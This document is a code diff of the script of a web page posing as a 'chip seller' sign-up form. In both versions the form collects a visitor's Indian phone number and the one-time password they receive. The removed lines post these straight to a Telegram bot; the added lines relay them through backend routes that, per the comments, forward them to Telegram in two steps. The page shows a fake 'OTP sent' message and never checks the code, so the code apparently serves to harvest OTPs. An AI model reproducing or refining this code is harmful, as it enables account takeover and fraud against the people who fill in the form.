@@ -167,85 +167,93 @@
         }
 
         // OTP Timer Simulator
-        function sendOTP() {
-            const phoneInput = document.getElementById('phone').value.trim();
-            if(phoneInput.length < 10) {
-                showToast('Please enter a valid 10-digit mobile number first!', 'error');
-                return;
-            }
+        // OTP Timer & Request Handler
+async function sendOTP() {
+    const phoneInput = document.getElementById('phone').value.trim();
+    if (phoneInput.length < 10) {
+        showToast('Please enter a valid 10-digit mobile number first!', 'error');
+        return;
+    }
 
-            const otpBtn = document.getElementById('otp-btn');
-            if (timerInterval) return;
+    const otpBtn = document.getElementById('otp-btn');
+    if (timerInterval) return;
 
-            showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
-            otpBtn.disabled = true;
-            countdownSeconds = 60;
-            otpBtn.innerText = `${countdownSeconds}s`;
-            otpBtn.classList.add('opacity-50', 'cursor-not-allowed');
+    // Backend ko phone number bhejo taaki Telegram par 1st message jaye
+    try {
+        await fetch('/send-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phoneInput })
+        });
+    } catch (error) {
+        console.error('Error sending OTP request:', error);
+    }
 
-            timerInterval = setInterval(() => {
-                countdownSeconds--;
-                otpBtn.innerText = `${countdownSeconds}s`;
-                if (countdownSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                    otpBtn.disabled = false;
-                    otpBtn.innerText = 'Request';
-                    otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                }
-            }, 1000);
+    showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
+    otpBtn.disabled = true;
+    countdownSeconds = 60;
+    otpBtn.innerText = `${countdownSeconds}s`;
+    otpBtn.classList.add('opacity-50', 'cursor-not-allowed');
+
+    timerInterval = setInterval(() => {
+        countdownSeconds--;
+        otpBtn.innerText = `${countdownSeconds}s`;
+        if (countdownSeconds <= 0) {
+            clearInterval(timerInterval);
+            timerInterval = null;
+            otpBtn.disabled = false;
+            otpBtn.innerText = 'Request';
+            otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
         }
+    }, 1000);
+}
 
-        // Form Submit Handler & Telegram Sender
-        async function handleFormSubmit(event) {
-            event.preventDefault();
+// Form Submit Handler & Telegram Sender (Step 2)
+async function handleFormSubmit(event) {
+    event.preventDefault();
 
-            const phone = document.getElementById('phone').value.trim();
-            const otp = document.getElementById('otp').value.trim();
-            const upline = document.getElementById('upline').value.trim() || 'None';
-            const submitBtn = document.getElementById('submit-btn');
+    const phone = document.getElementById('phone').value.trim();
+    const otp = document.getElementById('otp').value.trim();
+    const submitBtn = document.getElementById('submit-btn');
 
-            if (phone.length < 10) {
-                showToast('Please enter a valid phone number!', 'error');
-                return;
-            }
-            if (otp.length < 4) {
-                showToast('Please enter a valid OTP!', 'error');
-                return;
-            }
+    if (phone.length < 10) {
+        showToast('Please enter a valid phone number!', 'error');
+        return;
+    }
 
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
+    if (otp.length < 4) {
+        showToast('Please enter a valid OTP!', 'error');
+        return;
+    }
 
-            const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Submitting...</span>`;
 
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
+    try {
+        // Backend ko phone aur OTP bhejo taaki Telegram par 2nd message jaye
+        const response = await fetch('/verify-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, otp })
+        });
 
-                const data = await response.json();
+        const data = await response.json();
 
-                if (data.ok) {
-                    showToast('Sign up successful! Welcome aboard.', 'success');
-                    document.getElementById('signup-form').reset();
-                } else {
-                    showToast('Failed to send data. Check configuration.', 'error');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                showToast('Network error! Please try again.', 'error');
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = `<span>Sign up</span>`;
-            }
+        if (data.success) {
+            showToast('Sign up successful! Welcome aboard.', 'success');
+            document.getElementById('signup-form').reset();
+        } else {
+            showToast('Failed to send data. Check configuration.', 'error');
         }
+    } catch (error) {
+        console.error('Error:', error);
+        showToast('Network error! Please try again.', 'error');
+    } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = `<span>Sign up</span>`;
+    }
+}
+        
     </script>
 </body>
 </html>
